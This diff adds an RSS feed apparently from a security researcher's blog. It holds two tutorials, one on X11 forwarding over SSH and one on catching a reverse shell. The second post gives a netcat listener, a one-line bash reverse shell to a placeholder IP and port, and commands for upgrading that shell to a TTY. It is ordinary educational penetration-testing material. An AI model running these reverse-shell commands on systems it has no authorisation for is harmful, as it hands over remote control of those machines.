@@ -1,0 +1,97 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
+    <channel>
+      <title>nu1lptr - Tutorial</title>
+      <link>https://shengtuo.me</link>
+      <description>Learner // Cybersecurity Ph.D.@UMich CSE // Photographer</description>
+      <generator>Zola</generator>
+      <language>en</language>
+      <atom:link href="https://shengtuo.me/tags/tutorial/rss.xml" rel="self" type="application/rss+xml"/>
+      <lastBuildDate>Sun, 05 Oct 2025 21:48:00 -0700</lastBuildDate>
+      <item>
+          <title>X11 Forwarding over SSH</title>
+          <pubDate>Sun, 05 Oct 2025 21:48:00 -0700</pubDate>
+          <author>Shengtuo Hu</author>
+          <link>https://shengtuo.me/blog/ssh-x11-forwarding/</link>
+          <guid>https://shengtuo.me/blog/ssh-x11-forwarding/</guid>
+          <description xml:base="https://shengtuo.me/blog/ssh-x11-forwarding/">&lt;p&gt;I am debugging a GUI application, running on my remote Linux machine, and want to stay in my macOS development environment. This tutorial briefly goes through SSH configurations on both sides (Linux, macOS) for X11 forwarding.&lt;/p&gt;
+&lt;h2 id=&quot;linux-setup&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#linux-setup&quot; aria-label=&quot;Anchor link for: linux-setup&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+Linux Setup&lt;/h2&gt;
+&lt;p&gt;Of course, please ensure we have SSH server installed on the Linux machine at first.&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; apt install openssh-server&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Check its status&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; systemctl status ssh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Then, edit &lt;code&gt;/etc/ssh/sshd_config&lt;/code&gt; to at least enable the following entries:&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;plain&quot; data-name=&quot;/etc/ssh/sshd_config&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;AllowTcpForwarding yes&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;X11Forwarding yes&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;X11DisplayOffset 10&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;X11UseLocalhost yes&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;After that, restart &lt;code&gt;sshd&lt;/code&gt; service to apply our configuration changes.&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; systemctl restart ssh&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;macos-setup&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#macos-setup&quot; aria-label=&quot;Anchor link for: macos-setup&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+macOS Setup&lt;/h2&gt;
+&lt;p&gt;On the other side, we need to install &lt;a rel=&quot;noopener external&quot; target=&quot;_blank&quot; href=&quot;https://www.xquartz.org/&quot;&gt;XQuartz&lt;/a&gt;, an open-source X11 server for macOS. Note that, we have to log out and login again to enable xquartz after the installation.&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;brew&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; install --cask xquartz&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Now, we can connect to the remote Linux machine via SSH.&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;ssh&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; -X foo@your.host.ip.addr&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Usually, I would prefer saving the host and options in &lt;code&gt;~/.ssh/config&lt;/code&gt; as shown below:&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;plain&quot; data-name=&quot;~/.ssh/config&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;Host your-host-name*&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    HostName your.host.ip.addr&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    User foo&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    Port 22&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    IdentityFile ~/.ssh/id_rsa&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;Host your-host-name&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    ForwardX11 no&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;Host your-host-name-x11&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span&gt;    ForwardX11 yes&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;I do not want X11 forwarding everytime, so I add two host entries. The second entry with &lt;code&gt;-x11&lt;/code&gt; suffix has the X11 forwarding option, while the first one does not. Now, we can simply use &lt;code&gt;ssh your-host-name-x11&lt;/code&gt; to connect the remote machine. If X11 is not needed, we can use &lt;code&gt;ssh your-host-name&lt;/code&gt;.&lt;/p&gt;
+&lt;h2 id=&quot;reference&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reference&quot; aria-label=&quot;Anchor link for: reference&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+Reference&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a rel=&quot;noopener external&quot; target=&quot;_blank&quot; href=&quot;https://some-natalie.dev/blog/ssh-x11-forwarding/&quot;&gt;A quick and dirty guide to X11 forwarding over SSH&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</description>
+      </item>
+      <item>
+          <title>Shell Upgrade</title>
+          <pubDate>Fri, 15 Aug 2025 15:24:53 -0700</pubDate>
+          <author>Shengtuo Hu</author>
+          <link>https://shengtuo.me/blog/shell-upgrade/</link>
+          <guid>https://shengtuo.me/blog/shell-upgrade/</guid>
+          <description xml:base="https://shengtuo.me/blog/shell-upgrade/">&lt;h2 id=&quot;reverse-shell&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#reverse-shell&quot; aria-label=&quot;Anchor link for: reverse-shell&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+Reverse Shell&lt;/h2&gt;
+&lt;p&gt;A reverse shell is initiated from a remote machine and forward to our local port, so we can interact with the remote machine.&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# myip: ip address of the local machine&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# myport: local port&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# On the local machine&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;nc&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; -lnvp&lt;/span&gt;&lt;span&gt; $myport&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Waiting for the connection&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# On the remote machine&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;bash&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; -i&lt;/span&gt;&lt;span class=&quot;z-3&quot;&gt; &amp;gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; /dev/tcp/&lt;/span&gt;&lt;span&gt;$myip&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt;/&lt;/span&gt;&lt;span&gt;$myport&lt;/span&gt;&lt;span class=&quot;z-3&quot;&gt; 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;shell-upgrade&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#shell-upgrade&quot; aria-label=&quot;Anchor link for: shell-upgrade&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+Shell Upgrade&lt;/h2&gt;
+&lt;p&gt;After setting up the reverse shell, run the following commands in the reverse shell to get a TTY.&lt;/p&gt;
+&lt;pre class=&quot;giallo z-code&quot; &gt;&lt;code data-lang=&quot;shellscript&quot;&gt;&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Get a TTY&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;script&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; /dev/null -c bash&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Hit ^Z to send the local `nc` process to the background&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Disable &amp;quot;echo&amp;quot; for the local TTY and bring back `nc` process&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;stty&lt;/span&gt;&lt;span class=&quot;z-6&quot;&gt; raw -echo&lt;/span&gt;&lt;span class=&quot;z-3&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;z-2&quot;&gt; fg&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Reset the remote shell&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-12&quot;&gt;reset&lt;/span&gt;&lt;/span&gt;
+&lt;span class=&quot;giallo-l&quot;&gt;&lt;span class=&quot;z-1 z-i&quot;&gt;# Note that, you won&amp;#39;t see anything now, but remember to type in &amp;quot;screen&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;references&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#references&quot; aria-label=&quot;Anchor link for: references&quot;&gt;&lt;i class=&quot;icon&quot;&gt;&lt;/i&gt;&lt;/a&gt;
+References&lt;/h2&gt;
+&lt;iframe
+	class=&quot;youtube-embed&quot;
+	src=&quot;https://www.youtube-nocookie.com/embed/DqE6DxqJg8Q&quot;
+	allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot;
+	referrerpolicy=&quot;strict-origin-when-cross-origin&quot; allowfullscreen&gt;
+&lt;/iframe&gt;
+</description>
+      </item>
+    </channel>
+</rss>
